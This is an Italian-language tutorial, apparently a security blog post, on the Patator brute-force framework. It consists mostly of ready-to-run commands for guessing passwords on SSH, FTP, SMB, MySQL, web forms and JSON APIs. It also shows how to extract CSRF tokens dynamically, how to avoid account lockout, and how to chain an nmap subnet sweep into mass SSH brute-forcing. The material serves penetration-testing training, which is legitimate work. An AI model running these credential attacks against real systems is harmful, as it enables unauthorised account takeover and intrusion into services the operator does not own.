---
title: 'Patator: Brute-Force Framework Modulare per Test di Autenticazione'
slug: patator
description: 'Patator: Brute-Force Framework Modulare per Test di Autenticazione'
image: /Gemini_Generated_Image_e4rtue4rtue4rtue.webp
draft: false
date: 2026-02-21T00:00:00.000Z
lastmod: 2026-02-21T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - bruteforce
---

Patator è un bruteforcer modulare che supera i limiti di [Hydra](https://hackita.it/articoli/hydra) e [Medusa](https://hackita.it/articoli/medusa) in scenari complessi. In questa guida impari a configurare attacchi con token CSRF dinamici, filtri avanzati su response e parallelizzazione intelligente. Dalla configurazione base agli attacchi su form protetti.

## Cos'è Patator

Patator è un framework Python per bruteforce multi-protocollo con features avanzate:

* Gestione token dinamici ([CSRF](https://hackita.it/articoli/csrf))
* Filtri granulari su response
* Retry automatico su errori
* Output dettagliato
* Moduli estendibili

## Installazione e Setup

### Kali Linux

```bash
# Preinstallato su Kali
patator --help

# Se non presente
sudo apt update && sudo apt install patator -y
```

### Installazione da Source

```bash
# Clone repository
git clone https://github.com/lanjelot/patator.git /opt/patator
cd /opt/patator

# Installa dipendenze
pip3 install -r requirements.txt

# Esegui
python3 patator.py
```

### Dipendenze per Moduli

```bash
# Per tutti i moduli
pip3 install paramiko      # SSH
pip3 install pycurl        # HTTP
pip3 install dnspython     # DNS
pip3 install pyopenssl     # SSL
pip3 install pymysql       # MySQL
pip3 install psycopg2      # PostgreSQL
pip3 install cx_Oracle     # Oracle
```

## Struttura e Sintassi

### Sintassi Generale

```bash
patator modulo opzioni
patator ssh_login host=target user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

### Moduli Disponibili

| Modulo         | Protocollo | Uso                  |
| -------------- | ---------- | -------------------- |
| `ssh_login`    | SSH        | Bruteforce SSH       |
| `ftp_login`    | FTP        | Bruteforce FTP       |
| `telnet_login` | Telnet     | Bruteforce Telnet    |
| `smtp_login`   | SMTP       | Bruteforce email     |
| `http_fuzz`    | HTTP/HTTPS | Bruteforce web       |
| `mysql_login`  | MySQL      | Bruteforce database  |
| `pgsql_login`  | PostgreSQL | Bruteforce database  |
| `mssql_login`  | MSSQL      | Bruteforce database  |
| `oracle_login` | Oracle     | Bruteforce database  |
| `ldap_login`   | LDAP       | Bruteforce directory |
| `smb_login`    | SMB        | Bruteforce shares    |
| `vnc_login`    | VNC        | Bruteforce VNC       |
| `dns_forward`  | DNS        | Enumeration DNS      |
| `snmp_login`   | SNMP       | Bruteforce community |

## Attacchi per Protocollo

### SSH Bruteforce

```bash
# Username e password da file
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt

# Porta custom
patator ssh_login host=192.168.1.100 port=2222 \
        user=FILE0 password=FILE1 0=users.txt 1=passwords.txt

# Filtra solo successi
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        -x ignore:mesg='Authentication failed'
```

Output:

```
10:30:01 patator    INFO - Starting Patator v0.9 
10:30:01 patator    INFO - code  size    time | candidate
10:30:05 patator    INFO - 0     1234    0.5  | admin:admin123
```

### FTP Bruteforce

```bash
# FTP standard
patator ftp_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt

# Ignora fallimenti
patator ftp_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        -x ignore:mesg='Login incorrect'
```

### SMB Bruteforce

```bash
# SMB/CIFS
patator smb_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt

# Con dominio
patator smb_login host=192.168.1.100 domain=CORP \
        user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

### MySQL Bruteforce

```bash
# MySQL
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt

# Filtra errori
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        -x ignore:fgrep='Access denied'
```

## HTTP Fuzzing Avanzato

### HTTP Basic Auth

```bash
patator http_fuzz url=http://192.168.1.100/admin \
        user_pass=FILE0:FILE1 0=users.txt 1=passwords.txt \
        -x ignore:code=401
```

### HTTP POST Form

```bash
# Form login semplice
patator http_fuzz url=http://target.com/login method=POST \
        body='username=FILE0&password=FILE1' \
        0=users.txt 1=passwords.txt \
        -x ignore:fgrep='Invalid credentials'
```

### Form con CSRF Token

Il punto di forza di Patator rispetto a [Hydra](https://hackita.it/articoli/hydra):

```bash
# Step 1: Prima request per ottenere token
# Step 2: Usa token nella request di login

patator http_fuzz url=http://target.com/login method=POST \
        body='username=FILE0&password=FILE1&csrf_token=__CSRF__' \
        0=users.txt 1=passwords.txt \
        before_urls=http://target.com/login \
        before_egrep='__CSRF__:name="csrf_token" value="(\w+)"' \
        -x ignore:fgrep='Invalid'
```

### Session Cookie Handling

```bash
# Mantieni sessione tra request
patator http_fuzz url=http://target.com/login method=POST \
        body='user=FILE0&pass=FILE1' \
        0=users.txt 1=passwords.txt \
        accept_cookie=1 \
        -x ignore:fgrep='Login failed'
```

### Header Custom

```bash
# Aggiungi header
patator http_fuzz url=http://target.com/api/login method=POST \
        body='{"user":"FILE0","pass":"FILE1"}' \
        0=users.txt 1=passwords.txt \
        header='Content-Type: application/json' \
        header='X-API-Key: abc123' \
        -x ignore:fgrep='unauthorized'
```

## Filtri e Output

### Filtri Disponibili

| Filtro  | Descrizione      | Esempio                         |
| ------- | ---------------- | ------------------------------- |
| `code`  | HTTP status code | `-x ignore:code=401`            |
| `size`  | Response size    | `-x ignore:size=1234`           |
| `time`  | Response time    | `-x ignore:time>5`              |
| `mesg`  | Message esatto   | `-x ignore:mesg='error'`        |
| `fgrep` | Substring match  | `-x ignore:fgrep='Invalid'`     |
| `egrep` | Regex match      | `-x ignore:egrep='error\|fail'` |

### Combinare Filtri

```bash
# Ignora 401 E response piccole
patator http_fuzz url=http://target.com/admin \
        user_pass=FILE0:FILE1 0=users.txt 1=passwords.txt \
        -x ignore:code=401 \
        -x ignore:size=0

# Mostra solo successi specifici
patator http_fuzz url=http://target.com/login method=POST \
        body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt \
        -x ignore:fgrep='Invalid' \
        -x ignore:code=302  # Ignora redirect
```

### Output Dettagliato

```bash
# Log completo
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        --log-dir=/tmp/patator_logs

# CSV output
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        -l /tmp/results.csv
```

## Scenari Pratici di Penetration Test

### Scenario 1: Web Form con Anti-CSRF

```bash
# Target: login form con CSRF token

# 1. Analizza form con curl
curl -c cookies.txt http://target.com/login | grep csrf
# <input name="csrf_token" value="abc123xyz">

# 2. Patator con token dinamico
patator http_fuzz \
        url=http://target.com/login \
        method=POST \
        body='username=FILE0&password=FILE1&csrf_token=__TOKEN__' \
        0=users.txt \
        1=passwords.txt \
        before_urls=http://target.com/login \
        before_egrep='__TOKEN__:csrf_token" value="([^"]+)"' \
        accept_cookie=1 \
        -x ignore:fgrep='Invalid credentials'
```

### Scenario 2: API REST Bruteforce

```bash
# API con JSON
patator http_fuzz \
        url=http://target.com/api/v1/auth \
        method=POST \
        body='{"username":"FILE0","password":"FILE1"}' \
        0=users.txt \
        1=passwords.txt \
        header='Content-Type: application/json' \
        header='Accept: application/json' \
        -x ignore:fgrep='invalid' \
        -x ignore:code=401
```

### Scenario 3: DNS Subdomain Enumeration

```bash
# Bruteforce subdomains
patator dns_forward \
        name=FILE0.target.com \
        0=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
        -x ignore:code=3

# code=3 = NXDOMAIN (non esiste)
```

### Scenario 4: Multi-Target SSH

```bash
# Lista target
# targets.txt:
# 192.168.1.100
# 192.168.1.101
# 192.168.1.102

patator ssh_login host=FILE0 user=FILE1 password=FILE2 \
        0=targets.txt 1=users.txt 2=passwords.txt \
        -x ignore:mesg='Authentication failed'
```

## Parallelizzazione e Rate Limiting

### Controllo Threads

```bash
# Limita connessioni parallele
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        --threads=4

# Default: 10 threads
```

### Rate Limiting

```bash
# Delay tra request (evita lockout)
patator http_fuzz url=http://target.com/login method=POST \
        body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt \
        --rate-limit=1  # 1 request/secondo
```

### Timeout Configuration

```bash
# Timeout personalizzato
patator ssh_login host=192.168.1.100 user=FILE0 password=FILE1 \
        0=users.txt 1=passwords.txt \
        --timeout=30
```

## Confronto Patator vs Hydra

| Feature            | Patator    | Hydra     |
| ------------------ | ---------- | --------- |
| CSRF Token Support | ✓ Nativo   | ✗ No      |
| Filtri Granulari   | ✓ Avanzati | Limitati  |
| JSON Body          | ✓ Facile   | Complesso |
| Learning Curve     | Alta       | Bassa     |
| Velocità Raw       | Media      | Alta      |
| Protocolli         | 15+        | 50+       |
| Estendibilità      | ✓ Python   | Limitata  |

**Quando usare Patator:**

* Form con CSRF token
* API REST/JSON
* Filtri complessi su response
* Custom protocols

**Quando usare Hydra:**

* Attacchi semplici e veloci
* Protocolli non-HTTP
* Compatibilità massima

## Integrazione con Altri Tool

### Patator + Burp Suite

```bash
# Passa traffico attraverso Burp
patator http_fuzz url=http://target.com/login method=POST \
        body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt \
        proxy=127.0.0.1:8080
```

### Patator + [Nmap](https://hackita.it/articoli/nmap)

```bash
# Scan servizi
nmap -sV -p 22 192.168.1.0/24 -oG ssh_hosts.txt

# Estrai IP
grep "22/open" ssh_hosts.txt | cut -d " " -f 2 > targets.txt

# Bruteforce
patator ssh_login host=FILE0 user=root password=FILE1 \
        0=targets.txt 1=passwords.txt
```

## Troubleshooting

### Errore: Module Not Found

```bash
# Installa dipendenza mancante
pip3 install paramiko  # SSH
pip3 install pycurl    # HTTP
pip3 install pymysql   # MySQL
```

### HTTP Form Non Funziona

```bash
# 1. Verifica parametri con curl
curl -X POST -d "user=test&pass=test" http://target.com/login -v

# 2. Controlla redirect
# Aggiungi follow redirect se necessario
patator http_fuzz ... follow=1

# 3. Verifica Content-Type
patator http_fuzz ... header='Content-Type: application/x-www-form-urlencoded'
```

### Troppi False Positive

```bash
# Affina filtri
# 1. Identifica response normale
curl -X POST -d "user=admin&pass=wrong" http://target.com/login | wc -c
# Output: 1234 bytes

# 2. Filtra per size
patator http_fuzz ... -x ignore:size=1234
```

### Timeout Errors

```bash
# Aumenta timeout
patator ssh_login ... --timeout=60

# Riduci parallelismo
patator ssh_login ... --threads=2
```

## FAQ

**Patator è più lento di Hydra?**

Può essere più lento per attacchi semplici, ma è più efficiente per scenari complessi dove Hydra richiederebbe workaround.

**Come gestisco form JavaScript-heavy?**

Patator non esegue JavaScript. Per Single Page Applications, usa Selenium o [Burp Intruder](https://hackita.it/articoli/burp-suite).

**Posso creare moduli custom?**

Sì, Patator è scritto in Python ed è estendibile. Crea nuovi moduli in `/opt/patator/`.

**Come evito account lockout?**

Usa `--rate-limit` per delay, `--threads=1` per sequenziale, e password spray invece di bruteforce per-user.

**È legale usare Patator?**

Solo su sistemi autorizzati. Per pentest professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Patator GitHub](https://github.com/lanjelot/patator)
